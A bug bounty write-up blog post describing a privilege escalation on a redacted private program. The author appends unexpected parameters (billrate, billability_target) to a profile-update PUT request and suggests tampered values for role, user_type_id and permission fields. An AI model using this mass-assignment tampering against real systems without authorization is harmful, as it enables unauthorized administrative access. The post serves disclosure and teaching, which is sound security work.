---
title: 'EN \| Administrator level Privilege Escalation story'
date: 2020-03-19
permalink: /posts/administrator-level-privilege-escalation-story/
tags:
  - privilege escalation
  - administrator level
  - Bug Bounty
  - hack
  - bugbounty
  - write-up
  - poc
excerpt: 'EN \| Administrator level Privilege Escalation story'
---

In January of this year, I participated in a private program on HackerOne that was vulnerable to a Privilege Escalation. This is a private program, I can not disclose the name or company-related information per their request because of this I censored some parts of screenshots and requests. However, I wanted to share the details on how I escalated my basic privileges from a regular account to an admin user.

### Recon
Recon is the most important thing in the bug bounty, but this time I needn’t much to it. Because the Privilege Escalation was in the main domain. So I focused on requests and responses. 

### The most important step
The most important step to finding a privilege escalation is understanding to “How the application works?”, If you don’t pass this step, you can find privilege escalations easily. 

### Understanding the working principle of the application
There is only one tip. 
Read the field manual. (documentation)

<img src="/images/PrivEsc-BlogPost-1.PNG">  


### Finding Story
Refer to my penetration testing process, firstly I look for requests and responses. So, I did the same.

**URL Request:**
https://PRIVATE-PROGRAM.ext/me path and saw `whoami` code snippet in source-code and there were some privileges.

**whoami code snippet :**
`model_access_rules"
{"role":"administrator","user_type_id":1,"level":"userlevel10","model":"BillRate","allow_create":"all","allow_read":"all","allow_update":"all","allow_destroy":"all"},
{"role":"team_member","user_type_id":3,"level":"userlevel30","model":"BillRate","allow_create":"none","allow_read":"none","allow_update":"none","allow_destroy":"none"}`

<img src="/images/PrivEsc-BlogPost-3.PNG">  

This is a very good reference to find a privilege escalation, right? 

I am reading the code snippet and I understand that We can not update, create, read or destroy the “billrate” but an administrator can.



Examples : 

> `role` : We all know what is this. Change it to “admin, administrator, root”
> `user_type_id` : This refers to your privilege levels as integer. So we can put “0, 1, -1” to ours. 
> `level` : Doing the same function with the `user_type_id`, we can change it to “userlevel10”
> `allow_*` : This is controlling your privileges, so change it to “True, 1, yes, all”


So, we know what can I do with these parameters. Now we need only “How can we change these parameters?”. 


### Eureka! Eureka!
The website has a “profile update” function, we can add our potential vulnerable parameters to this request.


**Normal REQUEST:**
PUT /api/users/752902 HTTP/1.1  
Host: PRIVATE-PROGRAM  
Accept: application/json, text/javascript, */*; q=0.01  
Content-Type: application/x-www-form-urlencoded  
X-Requested-With: XMLHttpRequest  
Content-Length: 316  
Cookie: *redacted*  
  
first_name=hacker&last_name=hacker&location=...&tags=...&custom_field_values=...&email=samet%40wearehackerone.com&license_type=licensed 


Adding our potential vulnerable parameters to the request

**Vulnerable REQUEST:**
PUT /api/users/752902 HTTP/1.1  
Host: PRIVATE-PROGRAM  
Accept: application/json, text/javascript, */*; q=0.01  
Content-Type: application/x-www-form-urlencoded  
X-Requested-With: XMLHttpRequest  
Content-Length: 316  
Cookie: *redacted*  
  
first_name=hacker&last_name=hacker&location=...&tags=...&custom_field_values=...&email=samet%40wearehackerone.com&license_type=licensed &**billability_target=1337&billrate=1337**



We have an administrator-level privilege escalation now...

### The end : 
But it is duplicate.
<img src="/images/PrivEsc-BlogPost-2.PNG">  
